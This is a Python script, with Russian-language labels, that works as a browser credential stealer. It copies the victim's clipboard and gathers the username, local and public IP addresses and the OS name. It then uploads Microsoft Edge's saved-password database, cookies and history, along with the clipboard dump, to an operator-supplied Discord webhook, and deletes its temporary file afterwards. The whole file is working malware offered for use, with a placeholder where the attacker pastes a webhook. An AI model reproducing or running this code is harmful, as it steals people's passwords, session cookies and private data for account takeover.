import os
import pyperclip
from discord import SyncWebhook, Embed, File
import requests
import getpass
import socket
import random
import platform

os_name = platform.system()

username = getpass.getuser()

clipboard = pyperclip.paste()

directory = r"C:\Users\\" + username
file_path = os.path.join(directory, "SQLITE3.txt")

os.makedirs(directory, exist_ok=True)

with open(file_path, "w") as file:
    file.write(clipboard)

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

response = requests.get('https://httpbin.org/ip')
ip = response.json()['origin']

colors = [
    0x00ff00,
    0xff0000,
    0x0000ff,
    0xff00ff,
    0xffff00,
    0x00ffff,
    0xffffff,
]

random_color = random.choice(colors)

webhook = SyncWebhook.from_url("Сюда ваш вебхук")

embed = Embed(
    title="Новый пользователь!",
    description=f"Его имя - {username}",
    color=random_color,
)
embed.add_field(name="IP", value=f"(Локальный) - {ip_address}\n(Глобальный) - {ip}", inline=False)
embed.add_field(name="Сохраненые пароли:", value="Edge (Файл: LoginData)\n", inline=True)
embed.add_field(name="Cookies:", value="Edge (Файл: Cookies)\n", inline=True)
embed.add_field(name="История браузера:", value="Edge (Файл: History)\n", inline=True)
embed.add_field(name="Самое последнее что было в буфере обмена:", value="SQLITE3.txt", inline=True)
embed.add_field(name="Операционная система:", value=f"{os_name}", inline=True)
embed.set_footer(text="Мы не несем отвественность за это!")

file_edge_logindata = r"C:\Users\\" + username + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
file_edge_cookies = r"C:\Users\\" + username + r"\AppData\Local\Microsoft\Edge\User Data\Default\NetWork\Cookies"
file_edge_history = r"C:\Users\\" + username + r"\AppData\Local\Microsoft\Edge\User Data\Default\History"
file_clipboard = r"C:\Users\\" + username + r"\SQLITE3.txt"

edge_logindata = File(file_edge_logindata)
edge_cookie = File(file_edge_cookies)
edge_history = File(file_edge_history)
file3_clipboard = File(file_clipboard)

webhook.send(embed=embed, files=[edge_logindata, edge_cookie, edge_history, file3_clipboard])

file_directory = r"C:\Users\\" + username + r"\SQLITE3.txt"
os.remove(file_directory)
